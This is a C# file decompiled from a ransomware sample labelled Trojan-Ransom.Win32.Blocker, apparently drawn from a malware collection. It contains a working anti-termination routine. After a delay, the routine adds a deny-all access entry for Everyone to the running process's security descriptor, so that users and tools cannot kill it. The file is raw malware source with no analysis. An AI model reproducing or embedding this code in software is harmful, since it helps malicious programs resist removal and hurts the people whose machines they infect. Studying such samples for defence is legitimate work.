// Decompiled with JetBrains decompiler
// Type: EEqualsElevate
// Assembly: PiL, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 080DEF98-ACC3-4E31-8D71-0BFA1C815921
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.fbgc-c16aec67858284d94c1334be74b5badbd7e39b3c14773f6a4c0a961c5f655d2e.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;

[StandardModule]
internal sealed class EEqualsElevate
{
  public class EEqualsElevation
  {
    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool GetKernelObjectSecurity(
      IntPtr Handle,
      int securityInformation,
      [Out] byte[] pSecurityDescriptor,
      uint nLength,
      ref uint lpnLengthNeeded);

    public static void EEqualsStart()
    {
      Thread.Sleep(4100);
      try
      {
        IntPtr currentProcess = EEqualsElevate.EEqualsElevation.GetCurrentProcess();
        RawSecurityDescriptor objXD = EEqualsElevate.EEqualsElevation.objSecurity2(currentProcess);
        objXD.DiscretionaryAcl.InsertAce(0, (GenericAce) new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 987135, new SecurityIdentifier(WellKnownSidType.WorldSid, (SecurityIdentifier) null), false, (byte[]) null));
        EEqualsElevate.EEqualsElevation.objSecurity(currentProcess, objXD);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool SetKernelObjectSecurity(
      IntPtr Handle,
      int securityInformation,
      [In] byte[] pSecurityDescriptor);

    private static T objList<T>(ref T L, T M)
    {
      T obj;
      try
      {
        L = M;
        obj = M;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = default (T);
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public static void objSecurity(IntPtr objXPh, RawSecurityDescriptor objXD)
    {
      try
      {
        byte[] numArray = new byte[checked (objXD.BinaryLength - 1 + 1)];
        objXD.GetBinaryForm(numArray, 0);
        if (!EEqualsElevate.EEqualsElevation.SetKernelObjectSecurity(objXPh, 4, numArray))
          throw new Win32Exception();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static RawSecurityDescriptor objSecurity2(IntPtr XPh)
    {
      RawSecurityDescriptor securityDescriptor;
      try
      {
        byte[] L = new byte[0];
        uint lpnLengthNeeded;
        EEqualsElevate.EEqualsElevation.GetKernelObjectSecurity(XPh, 4, L, 0U, ref lpnLengthNeeded);
        if (lpnLengthNeeded < 0U || lpnLengthNeeded > (uint) short.MaxValue)
          throw new Win32Exception();
        if (!EEqualsElevate.EEqualsElevation.GetKernelObjectSecurity(XPh, 4, EEqualsElevate.EEqualsElevation.objList<byte[]>(ref L, new byte[checked ((int) ((long) lpnLengthNeeded - 1L) + 1)]), lpnLengthNeeded, ref lpnLengthNeeded))
          throw new Win32Exception();
        securityDescriptor = new RawSecurityDescriptor(L, 0);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        securityDescriptor = (RawSecurityDescriptor) null;
        ProjectData.ClearProjectError();
      }
      return securityDescriptor;
    }

    [System.Flags]
    public enum objEnum
    {
      objXPaa = 987135, // 0x000F0FFF
    }
  }
}
